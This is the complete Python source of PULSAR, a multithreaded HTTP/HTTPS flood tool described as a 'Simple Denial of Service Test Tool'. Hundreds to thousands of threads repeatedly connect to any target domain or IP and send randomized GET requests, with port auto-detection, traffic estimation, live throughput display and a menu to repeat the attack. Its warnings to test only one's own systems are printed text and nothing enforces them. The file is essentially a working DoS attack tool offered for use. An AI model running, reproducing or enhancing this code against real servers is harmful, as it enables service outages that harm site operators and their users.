# PULSAR.py
# Copyright (c) 2025 SALOYEK
# Licensed under the MIT License. See LICENSE file for details.

import socket
import ssl
import threading
import time
import argparse
import sys
import random
import os

# --- Set Console Title ---
def set_console_title(title_text):
    if sys.platform == "win32":
        os.system(f"title {title_text}")
    else:
        # For terminals compatible with xterm/VT100 (most on Linux/macOS)
        sys.stdout.write(f"\x1b]2;{title_text}\x07")
        sys.stdout.flush()

PROGRAM_NAME = "PULSAR"
STOP_KEY_INFO = "ESC TO STOP"

try:
    import keyboard # For ESC key capture
except ImportError:
    keyboard = None 

# --- Global Variables ---
stop_event = threading.Event()
packets_sent = 0
bytes_sent = 0
user_interrupted_attack = False

# --- Appearance Configuration (ANSI Colors) ---
class Colors:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKCYAN = '\033[96m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'

LINE_SEP = Colors.OKBLUE + "-" * 70 + Colors.ENDC
BANNER = f"""
{Colors.OKCYAN}{Colors.BOLD}
██████╗ ██╗   ██╗██╗     ███████╗ █████╗ ██████╗ 
██╔══██╗██║   ██║██║     ██╔════╝██╔══██╗██╔══██╗
██████╔╝██║   ██║██║     ███████╗███████║██████╔╝
██╔═══╝ ██║   ██║██║     ╚════██║██╔══██║██╔══██╗
██║     ╚██████╔╝███████╗███████║██║  ██║██║  ██║
╚═╝      ╚═════╝ ╚══════╝╚══════╝╚═╝  ╚═╝╚═╝  ╚═╝
{Colors.ENDC}
       {Colors.OKGREEN}Simple Denial of Service Test Tool{Colors.ENDC}
"""

# --- Helper Functions ---
def clear_console():
    os.system('cls' if os.name == 'nt' else 'clear')
    set_console_title(f"{PROGRAM_NAME} - {STOP_KEY_INFO}")


def print_header(text):
    print(f"\n{LINE_SEP}")
    print(f" {Colors.BOLD}{text.center(70)}{Colors.ENDC} ")
    print(LINE_SEP)

def print_warning(text):
    print(f"{Colors.WARNING}[!]{Colors.ENDC} {Colors.WARNING}WARNING: {text}{Colors.ENDC}")

def print_info(text):
    print(f"{Colors.OKCYAN}[*]{Colors.ENDC} INFO: {text}")

def print_success(text):
    print(f"{Colors.OKGREEN}[+]{Colors.ENDC} SUCCESS: {text}")

def print_error(text):
    print(f"{Colors.FAIL}[X]{Colors.ENDC} {Colors.FAIL}ERROR: {text}{Colors.ENDC}")

def get_random_user_agent():
    user_agents = [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Safari/605.1.15",
        f"{PROGRAM_NAME} Test Agent/1.3" 
    ]
    return random.choice(user_agents)

def format_size(num_bytes):
    for unit in ['B', 'KB', 'MB', 'GB', 'TB']:
        if abs(num_bytes) < 1024.0:
            return f"{num_bytes:.2f} {unit}"
        num_bytes /= 1024.0
    return f"{num_bytes:.2f} PB"

def is_valid_ip(address):
    try:
        socket.inet_aton(address)
        return True
    except socket.error:
        return False

# --- Main Attack Logic ---
def attack_worker(target_ip, target_port, target_host_header, use_ssl):
    global packets_sent, bytes_sent
    
    path = f"/?{random.randint(1000, 99999)}"
    request_str = f"GET {path} HTTP/1.1\r\nHost: {target_host_header}\r\nUser-Agent: {get_random_user_agent()}\r\nAccept: */*\r\nConnection: close\r\n\r\n"
    request_bytes = request_str.encode('utf-8')
    request_size = len(request_bytes)

    while not stop_event.is_set():
        conn = None
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(4) 

            if use_ssl:
                context = ssl.create_default_context()
                conn = context.wrap_socket(sock, server_hostname=target_host_header)
            else:
                conn = sock

            conn.connect((target_ip, target_port))
            conn.sendall(request_bytes)
            
            packets_sent += 1
            bytes_sent += request_size
            
        except (socket.error, ssl.SSLError, socket.timeout):
            pass 
        except Exception:
            pass
        finally:
            if conn:
                try:
                    conn.shutdown(socket.SHUT_RDWR)
                    conn.close()
                except socket.error:
                    pass

# --- Traffic Estimation Function ---
def estimate_traffic(target_input_for_est, port, num_threads, duration):
    print_info("Estimating traffic (this may take a moment)...")
    target_ip_for_est = None
    target_host_for_header_est = target_input_for_est 

    if is_valid_ip(target_input_for_est):
        target_ip_for_est = target_input_for_est
    else:
        try:
            target_ip_for_est = socket.gethostbyname(target_input_for_est)
        except socket.gaierror:
            print_error(f"Could not resolve domain '{target_input_for_est}' for traffic estimation.")
            return 0, 0
    
    if not target_ip_for_est:
        print_error("Could not determine IP address for estimation.")
        return 0,0

    use_ssl = (port == 443)
    path = f"/?{random.randint(1000, 99999)}"
    request_str = f"GET {path} HTTP/1.1\r\nHost: {target_host_for_header_est}\r\nUser-Agent: {get_random_user_agent()}\r\nConnection: close\r\n\r\n"
    single_request_size_bytes = len(request_str.encode('utf-8'))
    connections_per_sec_per_thread = 2.0 
    successful_connections = 0
    total_time_for_test = 0.0
    num_test_connections = max(1, min(3, num_threads // 20 if num_threads > 0 else 1)) 

    if num_test_connections > 0:
        print_info(f"Performing {num_test_connections} test connections to {target_ip_for_est}:{port}...")
        for _ in range(num_test_connections):
            start_conn_time = time.perf_counter()
            try:
                sock_test = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock_test.settimeout(2)
                if use_ssl:
                    context_test = ssl.create_default_context()
                    conn_test = context_test.wrap_socket(sock_test, server_hostname=target_host_for_header_est)
                else:
                    conn_test = sock_test
                conn_test.connect((target_ip_for_est, port))
                conn_test.shutdown(socket.SHUT_RDWR)
                conn_test.close()
                end_conn_time = time.perf_counter()
                total_time_for_test += (end_conn_time - start_conn_time)
                successful_connections += 1
            except Exception: pass 
        if successful_connections > 0:
            avg_time_per_connection = total_time_for_test / successful_connections
            if avg_time_per_connection > 0.001: connections_per_sec_per_thread = 1.0 / avg_time_per_connection
            else: connections_per_sec_per_thread = 50.0 
            print_info(f"Average time per test connection: {avg_time_per_connection:.4f} s")
            print_info(f"Estimated connections/sec/thread: {connections_per_sec_per_thread:.2f}")
        else: print_warning("Failed to perform test connections for estimation. Using default rate.")
    else: print_info("Skipped test connections (too few threads). Using default rate.")

    connections_per_sec_per_thread = min(connections_per_sec_per_thread, 100.0) 
    connections_per_sec_per_thread = max(connections_per_sec_per_thread, 0.5)
    estimated_total_requests = num_threads * connections_per_sec_per_thread * duration
    estimated_total_data_bytes = estimated_total_requests * single_request_size_bytes
    print_info(f"Single HTTP request size (payload): {single_request_size_bytes} B")
    print_info(f"Estimated total HTTP requests: {int(estimated_total_requests)}")
    print_success(f"Estimated MINIMUM OUTGOING traffic (HTTP payload): {Colors.BOLD}{format_size(estimated_total_data_bytes)}{Colors.ENDC}")
    print_warning("This is a VERY ROUGH estimate and only accounts for data sent by this script.")
    print_warning("It does not include protocol overhead (TCP/IP, SSL/TLS handshake) or server responses.")
    
    return estimated_total_data_bytes, estimated_total_requests

# --- Interactive Input Function ---
def get_interactive_input():
    print_header(f"{Colors.BOLD}{PROGRAM_NAME}{Colors.ENDC} Interactive Mode")
    target_input_val = "" 
    while not target_input_val:
        try:
            raw_target = input(f"{Colors.OKCYAN}[?]{Colors.ENDC} Enter target domain or IP address (e.g., example.com / 1.2.3.4) or '{Colors.WARNING}help{Colors.ENDC}': ").strip()
            if raw_target.lower() == 'help':
                print_info("Enter the domain name or IP address of the server you want to test.")
                print_info("Remember: only test systems you have explicit permission to target.")
                continue
            if not raw_target: print_warning("Target (domain/IP) cannot be empty."); continue
            if "." not in raw_target and not all(c.isdigit() for c in raw_target):
                 print_warning("Invalid target format. Should be an IP address (e.g., 1.2.3.4) or a domain (e.g., example.com)."); continue
            target_input_val = raw_target
        except KeyboardInterrupt: 
            print_warning("\n(Ctrl+C ignored during input. Please enter data or close the window.)")
            pass

    target_port_val = None
    while target_port_val is None:
        try:
            raw_port = input(f"{Colors.OKCYAN}[?]{Colors.ENDC} Enter target port (80, 443, or empty for auto-detect) or '{Colors.WARNING}help{Colors.ENDC}': ").strip()
            if raw_port.lower() == 'help':
                print_info("Enter the server port: 80 for HTTP, 443 for HTTPS.")
                print_info("Leave empty to auto-detect (tries 443, then 80).")
                continue
            if not raw_port: 
                print_info(f"Attempting to auto-detect port for {Colors.BOLD}{target_input_val}{Colors.ENDC}...")
                try:
                    print_info("Testing port 443 (HTTPS)...")
                    s_test_ssl = socket.create_connection((target_input_val, 443), timeout=2); s_test_ssl.close()
                    target_port_val = 443; print_success(f"Detected open port {Colors.BOLD}443 (HTTPS){Colors.ENDC} for {target_input_val}."); break
                except (socket.error, socket.timeout, socket.gaierror) as e:
                    print_warning(f"Port 443 (HTTPS) on {target_input_val} seems closed or unreachable ({type(e).__name__}).")
                    try:
                        print_info("Testing port 80 (HTTP)...")
                        s_test_http = socket.create_connection((target_input_val, 80), timeout=2); s_test_http.close()
                        target_port_val = 80; print_success(f"Detected open port {Colors.BOLD}80 (HTTP){Colors.ENDC} for {target_input_val}."); break
                    except (socket.error, socket.timeout, socket.gaierror) as e_http:
                        print_error(f"Could not auto-detect an open port (80 or 443) for {target_input_val} ({type(e_http).__name__})."); print_error("Please specify the port manually."); continue 
                if target_port_val is None: continue
            port_val_int = int(raw_port)
            if port_val_int not in [80, 443]: print_warning("Invalid port. Allowed: 80, 443."); continue
            target_port_val = port_val_int
        except ValueError: print_warning("That's not a valid port number.")
        except KeyboardInterrupt: print_warning("\n(Ctrl+C ignored during input. Please enter data or close the window.)"); pass

    duration_val = None
    while duration_val is None:
        try:
            raw_duration = input(f"{Colors.OKCYAN}[?]{Colors.ENDC} Enter test duration in seconds (e.g., 60, [{Colors.OKGREEN}default: 60{Colors.ENDC}]) or '{Colors.WARNING}help{Colors.ENDC}': ").strip()
            if raw_duration.lower() == 'help': print_info("Enter how long (in seconds) the test should run."); print_info("E.g., '30' for 30 seconds. Default is 60 seconds."); continue
            if not raw_duration: duration_val = 60; print_info(f"Using default duration: {Colors.BOLD}60 seconds{Colors.ENDC}."); break
            duration_val_int = int(raw_duration)
            if duration_val_int <= 0: print_warning("Duration must be greater than zero."); continue
            duration_val = duration_val_int
        except ValueError: print_warning("That's not a valid number of seconds.")
        except KeyboardInterrupt: print_warning("\n(Ctrl+C ignored during input. Please enter data or close the window.)"); pass
            
    num_threads_val = None
    while num_threads_val is None:
        try:
            raw_threads = input(f"{Colors.OKCYAN}[?]{Colors.ENDC} Enter number of threads (e.g., 100, [{Colors.OKGREEN}default: 100{Colors.ENDC}]) or '{Colors.WARNING}help{Colors.ENDC}': ").strip()
            if raw_threads.lower() == 'help': print_info("Enter how many concurrent 'attackers' (threads) to use."); print_info("More threads = potentially higher load. Default: 100."); print_warning("Too many threads can overload your own PC and network!"); continue
            if not raw_threads: num_threads_val = 100; print_info(f"Using default number of threads: {Colors.BOLD}100{Colors.ENDC}."); break
            threads_val_int = int(raw_threads)
            if threads_val_int <= 0: print_warning("Number of threads must be greater than zero."); continue
            
            if threads_val_int > 5000: 
                print_warning(f"Number of threads ({threads_val_int}) is EXTREMELY high. This will likely overload your PC and may cause instability. Use at your own risk!")
            elif threads_val_int > 2000: 
                print_warning(f"Number of threads ({threads_val_int}) is very high. This might overload your PC. Monitor your system resources.")
            
            num_threads_val = threads_val_int
        except ValueError: print_warning("That's not a valid number of threads.")
        except KeyboardInterrupt: print_warning("\n(Ctrl+C ignored during input. Please enter data or close the window.)"); pass
            
    return target_input_val, target_port_val, duration_val, num_threads_val

# --- ESC Key Press Callback ---
def on_esc_pressed_event(event):
    global user_interrupted_attack, stop_event
    if event.name == 'esc' and not stop_event.is_set():
        sys.stdout.write(f"\r{Colors.WARNING}{Colors.BOLD}ESC key detected!{Colors.ENDC} Stopping attack...                                        \n")
        sys.stdout.flush()
        user_interrupted_attack = True
        stop_event.set()

# --- Attack Execution Function ---
def run_attack(target_input_val, target_port_val, duration_val, num_threads_val):
    global packets_sent, bytes_sent, stop_event, user_interrupted_attack

    packets_sent = 0; bytes_sent = 0; stop_event.clear(); user_interrupted_attack = False
    esc_hook = None

    current_attack_title = f"{PROGRAM_NAME} - Attacking {target_input_val}:{target_port_val} - {STOP_KEY_INFO}"
    set_console_title(current_attack_title)

    print_header("Attack Configuration Summary")
    print_info(f"Target (input): {Colors.BOLD}{target_input_val}{Colors.ENDC}")
    print_info(f"Port: {Colors.BOLD}{target_port_val}{Colors.ENDC}")
    print_info(f"Duration: {Colors.BOLD}{duration_val} seconds{Colors.ENDC}")
    print_info(f"Threads: {Colors.BOLD}{num_threads_val}{Colors.ENDC}")

    target_ip_to_connect = None; target_host_for_header = target_input_val
    if is_valid_ip(target_input_val): 
        target_ip_to_connect = target_input_val
        print_info(f"Target '{target_input_val}' is an IP address. It will be used for connection.")
    else:
        print_info(f"Target '{target_input_val}' is treated as a domain. Attempting to resolve to IP address...")
        try: 
            target_ip_to_connect = socket.gethostbyname(target_input_val)
            print_success(f"Resolved domain {Colors.BOLD}{target_input_val}{Colors.ENDC} to IP: {Colors.BOLD}{target_ip_to_connect}{Colors.ENDC}")
        except socket.gaierror as e: 
            print_error(f"Could not resolve domain '{target_input_val}': {e}")
            set_console_title(f"{PROGRAM_NAME} - {STOP_KEY_INFO}"); return False 
    if not target_ip_to_connect: 
        print_error("Could not determine IP address for connection.")
        set_console_title(f"{PROGRAM_NAME} - {STOP_KEY_INFO}"); return False

    estimate_traffic(target_input_val, target_port_val, num_threads_val, duration_val)

    try:
        confirm = input(f"{Colors.WARNING}[?]{Colors.ENDC} To start the test, type '{Colors.OKGREEN}YES{Colors.ENDC}' (or '{Colors.FAIL}NO{Colors.ENDC}' to cancel): ").strip().upper()
        if confirm != 'YES': 
            print_info("Test start cancelled.")
            set_console_title(f"{PROGRAM_NAME} - {STOP_KEY_INFO}"); return "cancelled"
    except KeyboardInterrupt:
        print_warning("\n(Ctrl+C ignored during confirmation. Please type YES/NO or close the window.)")
        set_console_title(f"{PROGRAM_NAME} - {STOP_KEY_INFO}"); 
        return run_attack(target_input_val, target_port_val, duration_val, num_threads_val)


    use_ssl = (target_port_val == 443)
    print_header("Starting Attack")
    print_info(f"Attacking {Colors.BOLD}{target_ip_to_connect}:{target_port_val}{Colors.ENDC} ... for {Colors.BOLD}{duration_val} seconds{Colors.ENDC}...")
    if keyboard: 
        print_info(f"Press {Colors.BOLD}ESC{Colors.ENDC} to stop early.")
    else: 
        print_warning("Library 'keyboard' not available. Stopping with ESC is not possible.")
        print_warning("In this configuration, stopping an active attack is not possible without closing the console window.")


    threads_list = []; start_time = time.perf_counter()
    if keyboard:
        try: 
            esc_hook = keyboard.on_press(on_esc_pressed_event, suppress=True) 
        except Exception as e:
            print_warning(f"Could not set up ESC key listener (keyboard library error): {type(e).__name__} - {e}.")
            print_warning("Stopping with ESC might not be possible without closing the console window.")
            esc_hook = None

    for i in range(num_threads_val):
        thread = threading.Thread(target=attack_worker, args=(target_ip_to_connect, target_port_val, target_host_for_header, use_ssl))
        threads_list.append(thread); thread.daemon = True; thread.start()

    try:
        progress_bar_length = 30
        while True:
            elapsed_time = time.perf_counter() - start_time
            if elapsed_time >= duration_val or stop_event.is_set(): break 
            
            current_bytes = bytes_sent; current_packets = packets_sent
            bytes_per_sec = current_bytes / elapsed_time if elapsed_time > 0 else 0
            packets_per_sec = current_packets / elapsed_time if elapsed_time > 0 else 0
            progress = min(1.0, elapsed_time / duration_val)
            filled_length = int(progress_bar_length * progress)
            bar = '█' * filled_length + '-' * (progress_bar_length - filled_length)
            status_line = (
                f"\r{Colors.OKCYAN}Progress{Colors.ENDC}: [{Colors.OKGREEN}{bar}{Colors.ENDC}] {progress*100:.1f}% | "
                f"{Colors.BOLD}{elapsed_time:.1f}s{Colors.ENDC}/{duration_val}s | "
                f"Sent: {Colors.BOLD}{format_size(current_bytes)}{Colors.ENDC} ({current_packets} pkts) | "
                f"Speed: {Colors.BOLD}{format_size(bytes_per_sec)}/s{Colors.ENDC} ({packets_per_sec:.0f} pps)      "
            )
            sys.stdout.write(status_line); sys.stdout.flush()
            time.sleep(0.1)
            
        if not stop_event.is_set() and not user_interrupted_attack:
             sys.stdout.write("\n"); print_info("Test duration elapsed.")
    except KeyboardInterrupt:
        pass 
    finally:
        set_console_title(f"{PROGRAM_NAME} - {STOP_KEY_INFO}") 
        sys.stdout.write("\n"); sys.stdout.flush()
        if esc_hook and keyboard:
            try: keyboard.unhook(esc_hook)
            except Exception: pass 
        if not stop_event.is_set(): stop_event.set()
        print_info("Waiting for threads to finish (max. a few seconds)..."); time.sleep(0.5)
        final_elapsed_time = time.perf_counter() - start_time
        print_header("Attack Results")
        print_info(f"Attack duration: {Colors.BOLD}{final_elapsed_time:.2f} seconds.{Colors.ENDC}")
        print_info(f"Total HTTP requests (attempted): {Colors.BOLD}{packets_sent}{Colors.ENDC}")
        print_info(f"Total data sent (HTTP payload): {Colors.BOLD}{format_size(bytes_sent)}{Colors.ENDC}")
        if final_elapsed_time > 0:
            avg_bytes_per_sec = bytes_sent / final_elapsed_time; avg_packets_per_sec = packets_sent / final_elapsed_time
            print_info(f"Average speed: {Colors.BOLD}{format_size(avg_bytes_per_sec)}/s{Colors.ENDC} ({avg_packets_per_sec:.2f} pps)")
        if user_interrupted_attack: print_warning("Attack was interrupted by the user (ESC).")
        print_success(f"--- {Colors.BOLD}{PROGRAM_NAME} Attack Finished{Colors.ENDC} ---")
    return True

# --- Main Function ---
def main():
    is_color_supported = sys.stdout.isatty()
    if sys.platform == "win32":
        try: 
            import ctypes
            kernel32 = ctypes.windll.kernel32
            kernel32.SetConsoleMode(kernel32.GetStdHandle(-11), 7)
            is_color_supported = True
        except: 
            is_color_supported = False 
    
    if not is_color_supported:
        for attr in dir(Colors):
            if attr.isupper(): 
                setattr(Colors, attr, "")

    if keyboard is None:
        print(f"{Colors.WARNING}[!] Library 'keyboard' is not installed.{Colors.ENDC}")
        print(f"{Colors.WARNING}To use the ESC key to stop an attack, please install it: pip install keyboard{Colors.ENDC}")
        print(f"{Colors.WARNING}Without this library, stopping an active attack with ESC will not be possible.{Colors.ENDC}")
        print(f"{Colors.WARNING}The program will continue, but ESC functionality will be unavailable.{Colors.ENDC}")
        try:
            input(f"{Colors.OKGREEN}Press Enter to continue...{Colors.ENDC}")
        except KeyboardInterrupt:
            print_error("\nExiting due to Ctrl+C during initial warning.")
            sys.exit(1)

    clear_console(); 
    print(BANNER)
    print_warning("USE RESPONSIBLY AND ONLY ON YOUR OWN SYSTEMS!")
    print_warning("Misuse of this tool is ILLEGAL and can lead to serious consequences.")
    
    parser = argparse.ArgumentParser(
        description=f"{Colors.BOLD}{PROGRAM_NAME}{Colors.ENDC} - Simple DoS Test Tool.",
        epilog="Remember to use responsibly! Run without arguments or with `-i` for interactive mode.",
        formatter_class=argparse.RawTextHelpFormatter 
    )
    parser.add_argument("target", nargs='?', help="Target domain or IP address")
    parser.add_argument("port", nargs='?', type=int, help="Target port (80, 443)")
    parser.add_argument("duration", nargs='?', type=int, help="Test duration in seconds")
    parser.add_argument("-t", "--threads", type=int, default=None, help="Number of concurrent threads")
    parser.add_argument("-i", "--interactive", action="store_true", help="Run in interactive mode (forces interactive input even if CLI args are present for first run)")
    args = parser.parse_args()

    last_target = None; last_port = None; last_duration = None; last_threads = None
    
    # Flag to track if command-line arguments have been processed for the very first attack
    cli_args_processed_for_first_attack = False

    while True: 
        # Determine if new input is needed
        # New input is needed if:
        # 1. No previous attack parameters exist (last_target is None)
        # 2. OR if command-line arguments were not used for the first attack AND interactive mode is forced by -i
        
        should_get_new_input = False
        if not last_target: # Always get input if no previous parameters
            should_get_new_input = True
        
        # Process CLI arguments only once at the very beginning if not forced interactive
        if not cli_args_processed_for_first_attack and not args.interactive and \
           args.target and args.port is not None and args.duration is not None:
            print_info("Using command-line parameters..."); 
            target_input_val = args.target
            target_port_val = args.port
            duration_val = args.duration
            num_threads_val = args.threads if args.threads is not None and args.threads > 0 else 100
            
            if num_threads_val > 5000:
                print_warning(f"Number of threads from CLI ({num_threads_val}) is EXTREMELY high...")
            elif num_threads_val > 2000:
                print_warning(f"Number of threads from CLI ({num_threads_val}) is very high...")
            
            last_target, last_port, last_duration, last_threads = target_input_val, target_port_val, duration_val, num_threads_val
            cli_args_processed_for_first_attack = True
            should_get_new_input = False # Used CLI, so don't get new input this iteration
        
        if should_get_new_input:
            if last_target: # If not the very first run, clear for new input screen
                clear_console(); print(BANNER) 
            
            current_target, current_port, current_duration, current_threads = get_interactive_input()
            last_target, last_port, last_duration, last_threads = current_target, current_port, current_duration, current_threads
        
        # At this point, last_target, last_port, etc., hold the parameters for the current attack

        attack_result = run_attack(last_target, last_port, last_duration, last_threads)
        
        if attack_result == "cancelled": 
            pass

        # "What next?" menu loop
        while True:
            print_header("What would you like to do next?")
            print(f"{Colors.OKCYAN}[1]{Colors.ENDC} Repeat last attack ({last_target}:{last_port})")
            print(f"{Colors.OKCYAN}[2]{Colors.ENDC} Start a new attack (new settings)")
            print(f"{Colors.OKCYAN}[3]{Colors.ENDC} Close program")
            try:
                choice = input(f"{Colors.OKGREEN}Your choice (1-3): {Colors.ENDC}").strip()
                if choice == '1': 
                    clear_console(); print(BANNER)
                    # Parameters are already set in last_*, so just break to restart attack
                    break 
                elif choice == '2': 
                    last_target = None # This will trigger get_interactive_input in the next main loop
                    break 
                elif choice == '3': 
                    print_info(f"Thank you for using {Colors.BOLD}{PROGRAM_NAME}{Colors.ENDC}. Closing program...")
                    sys.exit(0)
                else: print_warning("Invalid choice. Please try again.")
            except KeyboardInterrupt:
                print_warning("\n(Ctrl+C ignored in menu. Please choose an option 1-3 or close the window.)")
                pass
        
if __name__ == "__main__":
    try:
        main()
    except SystemExit:
        pass
    except Exception as e:
        print_error(f"An unexpected global error occurred: {type(e).__name__} - {e}")
        # import traceback 
        # traceback.print_exc()
    finally:
        if keyboard:
            try: keyboard.unhook_all() 
            except Exception: pass
        if sys.platform == "win32":
            os.system(f"title {os.environ.get('COMSPEC', 'cmd.exe')}") 
        else:
             sys.stdout.write(f"\x1b]2;\x07") 
             sys.stdout.flush()
        print(Colors.ENDC)